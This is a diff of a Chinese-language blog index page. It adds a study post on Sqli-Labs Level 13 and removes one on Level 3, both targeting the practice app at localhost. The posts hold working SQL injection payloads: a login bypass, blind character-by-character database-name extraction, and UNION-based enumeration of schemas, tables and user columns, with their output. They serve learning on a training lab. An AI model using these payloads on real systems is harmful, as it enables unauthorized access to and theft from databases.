@@ -69,6 +69,57 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-sqli-labs13" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/04/06/sqli-labs13/" class="article-date">
+  <time datetime="2020-04-06T05:44:30.264Z" itemprop="datePublished">2020-04-06</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Sqli-Labs/">Sqli-Labs</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/04/06/sqli-labs13/">Sqli-Labs-Level13学习</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="level-13"><a href="#level-13" class="headerlink" title="level-13"></a>level-13</h1><p>创建日期 星期日 18 十一月 2018</p>
+<p><a href="http://127.0.0.1/SQL/Less-13/index.php" target="_blank" rel="noopener">http://127.0.0.1/SQL/Less-13/index.php</a></p>
+<p>用户名admin’)#，密码任意，成功登录。</p>
+<p>.\pasted_image.png</p>
+<p>提交uname=admin’) and left(database(),1)&gt;’s’#&amp;passwd=1&amp;submit=Submit</p>
+<p>得到当为s时，返回<br>.\pasted_image001.png</p>
+<p>得到第一位为s,依次类推。</p>
+<p>uname=admin’) and left(database(),2)&gt;’se’#&amp;passwd=1&amp;submit=Submit<br>得到第二位为e</p>
+<p>uname=admin’) and left(database(),3)&gt;’sec’#&amp;passwd=1&amp;submit=Submit<br>得到第三位为c</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://www.yi-diandian.com/2020/04/06/sqli-labs13/" data-id="ck8o2c3b300068ch5b58i5c7r" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Sqli-labs/" rel="tag">Sqli-labs</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-sqli-labs12" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2020/04/06/sqli-labs12/" class="article-date">
@@ -730,59 +781,6 @@
 
 
   
-    <article id="post-sqli-labs3" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/04/06/sqli-labs3/" class="article-date">
-  <time datetime="2020-04-06T05:04:11.721Z" itemprop="datePublished">2020-04-06</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/Sqli-Labs/">Sqli-Labs</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/04/06/sqli-labs3/">Sqli-Labs-Level3学习</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="level-3"><a href="#level-3" class="headerlink" title="level-3"></a>level-3</h1><p>创建日期 星期二 11 九月 2018</p>
-<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="http://127.0.0.1/sql/Less-3/index.php?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1/sql/Less-3/index.php?id=1&#39;</a><br>Welcome    Dhakkan<br>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 1) LIMIT 0,1’ at line 1</p>
-<p><a href="http://127.0.0.1/sql/Less-3/index.php?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1/sql/Less-3/index.php?id=1&#39;</a>) order by 3–+<br>Welcome    Dhakkan<br>Your Login name:Dumb<br>Your Password:Dumb </p>
-<p><a href="http://127.0.0.1/sql/Less-3/index.php?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1/sql/Less-3/index.php?id=1&#39;</a>) order by 4–+<br>Welcome    Dhakkan<br>Unknown column ‘4’ in ‘order clause’ </p>
-<p><a href="http://127.0.0.1/sql/Less-3/index.php?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1/sql/Less-3/index.php?id=1&#39;</a>) and 1=2 union select 1,2,3–+</p>
-<p>Welcome    Dhakkan<br>Your Login name:2<br>Your Password:3 </p>
-<p><a href="http://127.0.0.1/sql/Less-3/index.php?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1/sql/Less-3/index.php?id=1&#39;</a>) and 1=2 union select 1,group_concat(schema_name),3 from information_schema.schemata–+</p>
-<p>Welcome    Dhakkan<br>Your Login name:information_schema,challenges,mysql,performance_schema,security,test<br>Your Password:3 </p>
-<p><a href="http://127.0.0.1/sql/Less-3/index.php?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1/sql/Less-3/index.php?id=1&#39;</a>) and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=’security’–+</p>
-<p>Welcome    Dhakkan<br>Your Login name:emails,referers,uagents,users<br>Your Password:3 </p>
-<p><a href="http://127.0.0.1/sql/Less-3/index.php?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1/sql/Less-3/index.php?id=1&#39;</a>) and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=’users’–+<br>Welcome    Dhakkan<br>Your Login name:id,username,password<br>Your Password:3 </p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://www.yi-diandian.com/2020/04/06/sqli-labs3/" data-id="ck8o2c3c1001k8ch5fi2afjjh" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Sqli-labs/" rel="tag">Sqli-labs</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
 
 
   <nav id="page-nav">
@@ -840,6 +838,10 @@
       <ul>
         
           <li>
+            <a href="/2020/05/10/picoctfweb4/">picoCTF-WriteUp-A Simple Question</a>
+          </li>
+        
+          <li>
             <a href="/2020/05/10/picoctfweb3/">picoCTF-WriteUp-Secure Logon</a>
           </li>
         
@@ -853,10 +855,6 @@
         
           <li>
             <a href="/2020/05/05/sqli-labs45/">Sqli-Labs-Level45学习</a>
-          </li>
-        
-          <li>
-            <a href="/2020/05/05/sqli-labs44/">Sqli-Labs-Level44学习</a>
           </li>
         
       </ul>
